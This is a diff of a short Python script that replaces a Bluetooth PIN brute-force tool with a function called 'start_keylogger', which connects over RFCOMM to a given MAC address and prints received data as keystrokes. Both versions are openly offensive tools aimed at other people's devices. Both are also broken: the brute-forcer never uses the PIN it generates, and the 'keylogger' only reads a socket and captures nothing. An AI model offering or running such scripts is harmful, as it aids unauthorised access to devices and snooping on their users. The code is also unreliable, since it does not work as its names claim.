@@ -1,26 +1,15 @@
 import bluetooth
-import sys
-import time
 
-addr = None
+def start_keylogger(mac_address):
+    client_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+    client_sock.connect((mac_address, 16))
 
-if len(sys.argv) < 2:
-    print( "Usage: psm-bt-brute.py <bt_addr>")
-    sys.exit(1)
-else:
-    addr = sys.argv[1]
+    while True:
+        data = client_sock.recv(1024).decode()
+        if data:
+            print("Keystrokes: " + data)
 
- 
-for pin in range(10000):
-    pin = "%04d" % pin
-    print ("Testing PIN %s" % pin)
-    try:
-         
-        time.sleep(1)
-        s = bluetooth.BluetoothSocket(bluetooth.PIN)
-        s.connect((addr, 1))
-        s.close()
-        print ("Device %s has PIN %s" % (addr, pin))
-        break
-    except:
-        pass
+if __name__ == "__main__":
+    mac_address = input("Enter MAC address: ")
+
+    start_keylogger(mac_address)
